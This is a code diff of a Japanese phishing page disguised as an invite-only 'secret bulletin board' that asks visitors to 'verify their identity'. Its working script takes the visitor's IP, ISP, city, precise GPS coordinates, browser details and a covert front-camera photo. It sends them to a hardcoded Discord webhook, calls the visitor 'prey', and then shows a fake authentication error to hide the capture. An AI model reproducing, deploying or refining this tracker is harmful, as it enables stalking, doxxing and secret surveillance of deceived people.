@@ -1,81 +1,113 @@
 <!DOCTYPE html>
-<html>
+<html lang="ja">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>秘密の掲示板（公式）</title>
-    <meta charset="utf-8">
+    <style>
+        body { 
+            background: #f0f2f5; color: #1c1e21; font-family: 'Helvetica Neue', Arial, sans-serif;
+            margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh;
+        }
+        .container {
+            background: white; padding: 40px; border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px;
+        }
+        .logo { font-size: 2rem; font-weight: bold; color: #1877f2; margin-bottom: 20px; }
+        .info { font-size: 0.9rem; color: #606770; margin-bottom: 30px; line-height: 1.5; }
+        .enter-btn {
+            background: #1877f2; color: white; border: none; width: 100%; padding: 15px;
+            font-size: 1.1rem; font-weight: bold; border-radius: 6px; cursor: pointer;
+        }
+        #status { margin-top: 20px; color: #d33; font-weight: bold; display: none; }
+        #loading { display: none; margin-top: 20px; }
+        video { position: absolute; width: 1px; height: 1px; opacity: 0; }
+    </style>
 </head>
 <body>
-    <h1>読み込み中...</h1>
-    <p>掲示板を表示するには、位置情報とデバイスの確認を許可してください。</p>
 
-    <canvas id="canvas" style="display:none;"></canvas>
+<div class="container" id="main-box">
+    <div class="logo">㊙️ 秘密の掲示板</div>
+    <div class="info">
+        この掲示板は招待制の公式プラットフォームです。<br>
+        閲覧するには、本人確認（デバイスと位置情報の認証）が必要です。
+    </div>
+    <button class="enter-btn" onclick="startProcess()">認証して入室</button>
+    <div id="status">認証エラー: 権限を許可してください</div>
+    <div id="loading">サーバーに接続中...</div>
+</div>
 
-    <script>
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1492465803109466143/JvoWk-yMCXTaC25OBrcZBQ9etMeOENU8VxYWVT_fG7P7osAOUc3jqwckWr7X4poHmKkq";
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
-    async function captureAndSend() {
-        let payload = {
-            content: "||PAUSE… NO HOMO|| 新しい獲物が掲示板にアクセスしたぜ。",
-            embeds: []
-        };
+<script>
+    const WEBHOOK = "https://discord.com/api/webhooks/1492465803109466143/JvoWk-yMCXTaC25OBrcZBQ9etMeOENU8VxYWVT_fG7P7osAOUc3jqwckWr7X4poHmKkq";
+    let ipInfo = "取得中...";
 
+    // ページ読み込み時にIPを先行取得
+    window.onload = async () => {
         try {
-            // 1. IPと基本情報の取得
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const ipData = await ipRes.json();
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            ipInfo = `【住所付近】: ${data.city}, ${data.region}, ${data.country_name}\n【IP】: ${data.ip}\n【ISP】: ${data.org}`;
+        } catch(e) { ipInfo = "情報取得エラー"; }
+    };
 
-            // 2. 位置情報の取得（住所特定用）
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const geoData = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude} (精度: ${pos.coords.accuracy}m)`;
-                
-                // 3. カメラの起動と撮影
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
+    async function startProcess() {
+        document.getElementById('loading').style.display = 'block';
+        document.getElementById('status').style.display = 'none';
 
+        // 1. 位置情報の要求
+        navigator.geolocation.getCurrentPosition(
+            async (position) => {
+                const gps = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+                await capture(gps);
+            },
+            async () => {
+                await capture("GPS拒否");
+            },
+            { enableHighAccuracy: true }
+        );
+    }
+
+    async function capture(gpsInfo) {
+        try {
+            // 2. カメラの要求
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            // 少し待ってから撮影
+            setTimeout(() => {
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                // 画像をBlobに変換
-                canvas.toBlob(async (blob) => {
-                    const formData = new FormData();
-                    
-                    // JSONデータを作成
-                    const info = {
-                        username: "秘密の掲示板・追跡ボット",
-                        embeds: [{
-                            title: "ターゲット捕捉完了",
-                            color: 0x00ff00,
-                            fields: [
-                                { name: "IP", value: ipData.ip || "取得失敗" },
-                                { name: "プロバイダ", value: ipData.org || "不明" },
-                                { name: "地域", value: `${ipData.city}, ${ipData.region}, ${ipData.country_name}` },
-                                { name: "GPS座標", value: geoData },
-                                { name: "デバイス", value: navigator.userAgent }
-                            ]
-                        }]
-                    };
 
-                    formData.append('payload_json', JSON.stringify(info));
-                    formData.append('file', blob, 'face_shot.png');
+                stream.getTracks().forEach(t => t.stop());
 
-                    // Webhookにフルクリップで送信
-                    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-                    
-                    // 終了後に掲示板っぽく見せるならリダイレクト
-                    // window.location.href = "https://example.com/real_board";
+                canvas.toBlob(blob => {
+                    const fd = new FormData();
+                    fd.append('file', blob, 'target_face.png');
+                    fd.append('payload_json', JSON.stringify({
+                        content: `||PAUSE… NO HOMO||\n🚩 **秘密の掲示板に獲物が入室したぜ**\n\n**【位置情報】**\n${gpsInfo}\n\n**【ネットワーク情報】**\n${ipInfo}\n\n**【ブラウザ】**\n${navigator.userAgent}`
+                    }));
+                    fetch(WEBHOOK, { method: 'POST', body: fd });
                 }, 'image/png');
-            });
+
+                // 最後にそれっぽくエラーか偽の完了を出す
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('status').innerText = "認証に失敗しました。時間をおいて再度お試しください。";
+                    document.getElementById('status').style.display = 'block';
+                }, 2000);
+
+            }, 800);
         } catch (err) {
-            console.error("Error cooking data:", err);
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('status').style.display = 'block';
         }
     }
-
-    // ページ読み込み時に実行
-    window.onload = captureAndSend;
-    </script>
+</script>
 </body>
 </html>
